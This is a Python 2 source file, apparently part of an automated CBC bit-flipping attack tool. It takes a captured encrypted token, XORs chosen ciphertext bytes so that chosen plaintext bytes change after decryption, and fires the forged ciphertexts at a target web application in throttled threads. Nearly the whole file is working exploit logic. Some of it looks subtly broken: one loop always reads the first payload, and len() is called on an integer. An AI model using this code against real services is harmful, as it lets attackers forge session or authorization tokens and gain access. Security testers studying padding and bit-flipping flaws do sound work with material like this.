import HTTPRequester
import sys
import time

from Crypto.Cipher import AES
from os import urandom
from threading import Thread

original_key = None
block_size = None
position = None
payloads_list = None
list_blocks_attacked = None
payload_with_position = None
payloads_arr = None
max_threads = None
delay = None


class Th(Thread):
    def __init__(self, ciphertext, block, st):
        Thread.__init__(self)
        self.ciphertext = ciphertext
        self.block = block
        self.starting_position = st

    def run(self):
        HTTPRequester.HTTP_request(self.ciphertext, self.block, self.starting_position)


def set_original_key(key):
    global original_key
    original_key = key


def set_key():
    global original_key
    original_key = HTTPRequester.get_key()


def set_params(block_size1, position1, payloads_list1, max_threads1, delay1):
    global original_key, block_size, position, payloads_list, list_blocks_attacked, payload_with_position, payloads_arr, max_threads, delay
    max_threads = max_threads1
    delay = delay1
    block_size = block_size1
    position = position1
    payloads_list = payloads_list1
    bytesize_key = len(original_key)
    list_blocks_attacked = []
    if block_size == 'X':
        block_size = [8, 16]
        if position == 'X':
            blocks8 = bytesize_key / 8
            blocks16 = bytesize_key / 16

            list_blocks_attacked.append(range(0, blocks8))
            list_blocks_attacked.append(range(0, blocks16))
        else:
            list_blocks_attacked.append(position)
            list_blocks_attacked.append(position)
    else:
        block_size = [block_size]
        if position == 'X':
            blocks = bytesize_key/int(block_size[0])
            list_blocks_attacked.append(range(0, blocks))
        else:
            list_blocks_attacked.append(position)

    if 'X' in payloads_list:
        payload_with_position = False
        payloads_arr = payloads_list.split('/')
    else:
        payload_with_position = True
        payloads_arr = payloads_list.split('/')


def exploit():
    global original_key, block_size, position, payloads_list, block_size, list_blocks_attacked, payloads_arr, max_threads, delay
    i = 0
    j = 0
    cipher_list_aux = []
    threads = []

    while (j * int(block_size[i])) < (len(original_key)):
        cipher_list_aux.append(original_key[j * int(block_size[i]): int(block_size[i]) + (j * int(block_size[i]))])
        j = j + 1

    while i < len(block_size):
        cipher_list = cipher_list_aux
        blocks_attacked = list_blocks_attacked[i]
        k = 0

        while k < len(blocks_attacked):
            attack_on_block = cipher_list[int(blocks_attacked[k])]
            list1 = list(attack_on_block)
            #if payload is not X:

            if 'X' not in payloads_list:
                l = 0
                starting_position = None

                while l < len(payloads_arr):
                    starting_position, payload = payloads_arr[0].split('-')
                    whatyouknow, whatyouwant = payload.split(',')
                    whatyouknow = list(whatyouknow)
                    whatyouwant = list(whatyouwant)

                    if len(whatyouknow) > len(block_size[i]):
                        print 'Inform lower position for starting position for %s, %s, %s . It is bigger than block of size %s' % (starting_position, whatyouknow, whatyouwant, block_size[i])
                        sys.exit()
                    else:
                        it = 0
                        while it < len(whatyouknow):
                            list1[int(starting_position) + it] = chr(ord(list1[int(starting_position) + it]) ^ ord(whatyouknow[it]) ^ ord(whatyouwant[it]))
                            it = it + 1
                    l = l + 1

                cipher_list[int(blocks_attacked[k])] = ''.join(list1)
                ciphertext = ''.join(cipher_list)
                #print ciphertext.encode('base64')
                while len(threads) == int(max_threads):
                    for t in threads:
                        if not t.isAlive():
                            threads.remove(t)
                    time.sleep(2)

                new_thread = Th(ciphertext, int(blocks_attacked[k]), starting_position)
                threads.append(new_thread)
                new_thread.start()
                time.sleep(delay)
                #CALL THE REQUEST

            else:
                aux = 0

                while aux < len(payloads_arr):
                    x, payload = payloads_arr[aux].split('-')
                    whatyouknow, whatyouwant = payload.split(',')
                    whatyouknow = list(whatyouknow)
                    #whatyouknow = whatyouknow[::-1]
                    whatyouwant = list(whatyouwant)
                    #whatyouwant = whatyouwant[::-1]
                    starting_position = 0

                    while starting_position + len(whatyouwant) <= int(block_size[i]):
                        it = 0
                        list_aux = list(attack_on_block)

                        while it < len(whatyouknow):
                            list_aux[starting_position + it] = chr(
                                (ord(list_aux[starting_position + it]) ^ ord(whatyouknow[it]) ^ ord(whatyouwant[it])))
                            it = it + 1
                        cipher_list[int(blocks_attacked[k])] = ''.join(list_aux)
                        ciphertext = ''.join(cipher_list)
                        #print cipheraux
                        #print decrypt(ciphertext)

                        while len(threads) == int(max_threads):
                            for t in threads:
                                if not t.isAlive():
                                    threads.remove(t)
                            time.sleep(2)

                        new_thread = Th(ciphertext, int(blocks_attacked[k]), starting_position)
                        threads.append(new_thread)
                        new_thread.start()
                        starting_position = starting_position + 1
                    #go into all the payloads
                    #split ('-') and get starting position and payload
                    #split (',') and get what you know and what you want to change
                    #list(what you know) and list(what you want to change)
                    #check if len of lists -1 are < than block len
                    # if is bigger:
                        #return alert: position should be decreased for starting position and what you know and what you want to change
                    #else:
                        #perform bit flipping
                        #generate key
                        #call http
                #if payload is X:
                    #go into all the positions while starting position + len(payload) < len(block)
                        #perform bit flipping
                        #generate key
                        #call http
                    aux = aux + 1
            k = k + 1
        i = i + 1
